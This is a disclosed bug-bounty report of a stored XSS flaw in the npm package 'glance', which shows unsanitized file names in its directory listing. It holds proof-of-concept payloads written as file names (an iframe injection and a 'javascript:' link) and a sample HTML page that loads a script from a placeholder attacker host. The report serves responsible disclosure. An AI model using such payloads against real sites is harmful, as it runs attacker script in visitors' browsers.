# [glance] Stored XSS via file name allows to run arbitrary JavaScript when directory listing is displayed in browser

## Report Details
- **Report ID**: 310133
- **URL**: https://hackerone.com/reports/310133
- **State**: Closed
- **Severity**: low
- **Submitted**: 2018-01-29T13:29:06.051Z
- **Disclosed**: 2018-04-15T18:32:20.408Z

## Reporter
- **Username**: bl4de
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
Hi Guys,

There is a Stored XSS vulnerability in ```glance``` module. File name, which contains malicious HTML (eg. embedded ```iframe``` element or ```javascript:``` pseudoprotocol handler in ```<a>``` element) allows to execute JavaScript code against any user who opens directory listing contains such crafted file name. 

## Module

**glance**

a quick disposable http server for static files

https://www.npmjs.com/package/glance

Stats
33 downloads in the last day
34 downloads in the last week
269 downloads in the last month

~3000 estimated downloads per year

## Description

```glance``` serves files from the server where was installed. Because there is no file names sanitization, following names can be used:

- example file name 1: iframe element serving HTML file with malicious JavaScript fired when iframe loads its content:

```
"><iframe="malicious_frame.html">
```

```malicious_iframe.html``` example:

```HTML
<html>

<head>
    <meta charset="utf8" />
    <title>Frame embeded with malware :P</title>
</head>

<body>
    <p>iframe element with malicious code</p>

    <script type="text/javascript" src="http://attacker.server/malware.js"></script>
</body>

</html>
```

- example file name 2: inline ```javascript:``` pseudo protocol event handler:

```
javascript:alert('you are pwned!')
```

When user clicks on this file, instead of seeing its content, malicious JavaScript is executed



## Steps To Reproduce:

- install ```glance```:

```
$ npm install glance
```

- in directory which will be served via ```glance```, put file with following name:


```
javascript:alert('you are pwned!')
```

- run ```glance``` in selected direcotry:

```
me:~/playground/hackerone/Node$ ./node_modules/glance/bin/glance.js --verbose --dir ./
```

You will see list of files. Now, click file with ```javascript:alert('you are pwned!')``` name.
JavaScript is executed and popup is fired:

{F258419}


## Supporting Material/References:

- Ubuntu 16.04 LTS
- Chromium 66.0.3333.0 (Developer Build) (64-bit) 
- Node.js version: v8.9.4 LTS
- npm version: 5.6.0
- curl 7.47.0


Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.

Regards,

Rafal 'bl4de' Janicki

## Impact

This vulnerability can be used by attacker to serve malicious JavaScript against any user.

## Attachments
- glancexss.png
